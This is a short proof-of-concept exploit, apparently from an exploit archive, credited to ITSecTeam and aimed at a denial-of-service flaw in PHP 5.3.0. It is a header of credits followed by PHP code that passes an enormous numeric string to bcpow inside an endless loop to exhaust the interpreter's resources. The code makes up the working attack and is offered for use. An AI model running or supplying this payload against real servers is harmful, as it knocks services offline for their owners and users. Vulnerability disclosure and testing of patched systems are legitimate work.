//#DOS Php 5.3.x
//###########################################################################
//#Title: Dos Php 5.3.0
//#Vendor: http://php.net
//#Tested On Php 5.3.0 On Windows xp Sp3 And Redhat
//###########################################################################
//#AUTHOR: ITSecTeam
//#Email: Bug@ITSecTeam.com
//#Website: http://www.itsecteam.com
//#Forum : http://forum.ITSecTeam.com
//#Original Advisory: www.ITSecTeam.com/en/vulnerabilities/vulnerability34.htm
//#Thanks: Pejvak,M3hr@nS,r3dm0v3,am!rkh@n
//###########################################################################
//#
//# Exploit
//###########################################################################
<?php
$junk=str_repeat("99999999999999999999999999999999999999999999999999",99999);
for($i=0;$i<2;){
$buff=bcpow($junk, '3', 2);
$buff=null;
}
//Coded By Pejvak;
?>